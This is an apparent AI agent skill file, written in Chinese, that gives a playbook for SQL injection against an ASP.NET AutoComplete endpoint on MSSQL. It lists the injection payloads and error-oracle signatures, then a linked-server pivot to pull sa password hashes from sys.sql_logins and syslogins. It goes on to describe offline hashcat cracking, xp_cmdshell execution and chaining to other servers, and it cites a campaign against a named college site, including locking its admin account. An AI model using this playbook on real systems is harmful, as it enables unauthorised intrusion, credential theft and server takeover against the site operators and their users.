---
name: mssql-sqli-escalation
description: "受限MSSQL注入(解析层墙/表名注入)诊断+链接服务器跃迁+登录哈希外带。"
version: 1.0.0
author: Hermes Agent
license: MIT
platforms: [windows, linux, macos]
metadata:
  hermes:
    tags: [penetration, sqli, mssql, linked-server, hash-exfiltration]
---

# MSSQL 受限注入诊断与跃迁

适用: 参数被拼进存储过程动态 SQL 的表名/列名位置（如 ASP.NET AutoComplete.asmx `contextKey`）、
解析层有硬约束（禁函数/WHERE/字符串拼接）的 MSSQL 注入点、以及需要从"只读"跃迁到"登录凭据/执行"的场景。

## 注入点形态（EduSuite/AutoComplete 模式）

- 端点: `/WebMethod/AutoComplete.asmx/GetCompletionList?prefixText=&count=100&contextKey=0|{子查询}|{列名}`
- contextKey 三段: 前缀|表表达式|列名，拼进存储过程动态 SQL:
  `SELECT TOP N {col} FROM {TableName} Where Name Like '%%'`
- 200 返回 XML `<string>` 列表; 500 返回 SQL 详细报错 = 免费 oracle（报错开启时）
- 常见解析层墙: 子查询内禁函数 / WHERE / 字符串拼接; LIKE 墙 `'%' + @prefix + '%'`，非空前缀挂
- 返回 varbinary 列 = base64 序列化（M_Login 密码列实测）→ 哈希可外带

## 三种报错签名 → 反推生成 SQL 形状（别猜，用报错当 oracle）

| 报错 | 含义 |
|------|------|
| `Incorrect syntax near the keyword 'Where'` | 子查询形式被拒（FROM 后拼接结果非法） |
| `Incorrect syntax near '%%'` | 裸表名/系统视图/兼容视图四段式挂（解析层墙） |
| `Unclosed quotation mark after the character string 'xxx Where Name Like '%%''` | 泄漏生成 SQL 尾部——直接反推存储过程模板; JOIN 等复杂子查询挂 |

第三种报错的尾部字符串是免费情报源，能直接看到存储过程怎么拼后缀。

## 形状控制变量实验（6 连测，间隔 sleep 2s）

1. `(SELECT 1 AS Name) x` — 纯子查询无表
2. `(SELECT TOP 3 name AS Name FROM [spt_values]) x` — 子查询+本地表
3. `[spt_values]` — 本地裸表名
4. `[DB].[dbo].[M_Staff]` — 本地两段
5. `[sql5063].[master].[dbo].[spt_values]` — 四段裸名
6. `[sql5063].[DB].[dbo].[M_Staff]` — 四段裸名用户表

结论模式: 裸表名可通 → 系统对象/其他租户库直接四段式打; 子查询可通 → 任意表达式（但函数被墙）。

## 链接服务器跃迁（只读 → 哈希）

- 链接服务器 + sa 登录 = 本地权限墙不存在: 四段式 `[server].[db].[schema].[table]` 直读
- 主目标: `[sql5063].[master].[sys].[sql_logins]` 的 `password_hash`（varbinary，sa 可读）
- 系统视图四段式常被链接服务器限制（报 near '%%'）→ 换兼容视图:
  `[sql5063].[master].[dbo].[sysxlogins]` / `[sql5063].[master].[dbo].[syslogins]`（password 列，旧格式）
- 拿到哈希 → 本地 hashcat 离线爆（零噪音）→ sa 明文 → 登 SQL 服务器执行命令（xp_cmdshell = 写操作，须先获批）
- 顺带: `[sql5063].[master].[sys].[servers]` 四段式读 = 找更多链接服务器（链式跳转）;
  `sys.databases` 四段式读 = 横向扩数据面（每台 SQL 常挂 1-3 个租户库）

## 红线

- 只读 SELECT 探测可自行进行; xp_cmdshell / 任何写/执行必须先获批
- 在线猜密码会锁账号（acecollege admin 被 8 次失败锁死 = 可见影响）→ 永远优先哈希离线爆破
- prefixText 参数是潜在次级注入面（非空前缀挂的机制值得单独验证），先测只读形态
- 多方向策略讨论: 先大白话讲清每条路子的机制/回报/风险，等用户拍板再跑探测（用户会中途喊停确认思路）

## 脚本骨架

```python
def sqli(subq, col="Name", prefix="", retries=4):
    ck = f"0|{subq}|{col}"
    # requests.get("http://target/WebMethod/AutoComplete.asmx/GetCompletionList",
    #              params={"prefixText": prefix, "count": 100, "contextKey": ck},
    #              proxies={"http":"http://127.0.0.1:7890","https":"http://127.0.0.1:7890"},
    #              timeout=30)
    # 200: re.findall(r"<string>(.*?)</string>", r.text)
    # 500: re.sub(r"<[^>]+>", "", r.text)[:140]  ← 错误 oracle
    # 失败 sleep 4s 重试（代理环境必需 proxies，否则 NETERR）
```

## 参考

- 实战来源: usc_rec 战役 acecollege.in（2026-08），工具与数据在 `D:\Pentest\渗透\usc_rec_菲律宾\`
